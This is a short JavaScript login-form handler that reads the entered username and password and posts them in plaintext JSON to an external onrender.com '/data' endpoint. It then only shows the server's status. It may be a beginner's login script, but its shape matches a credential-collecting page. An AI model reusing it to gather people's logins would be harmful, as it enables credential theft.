document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;

  if (!username || !password) {
    alert('Please enter both username and password.');
    return;
  }

  try {
    // Replace this URL with your actual backend URL with https!
    const response = await fetch('https://rebokc.onrender.com/data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ username, password })
    });

    if (!response.ok) {
      throw new Error(`Server error: ${response.status}`);
    }

    const result = await response.json();

    alert('Server response: ' + result.status);
  } catch (err) {
    console.error('Failed to send login info:', err);
    alert('Failed to send login info.');
  }
});
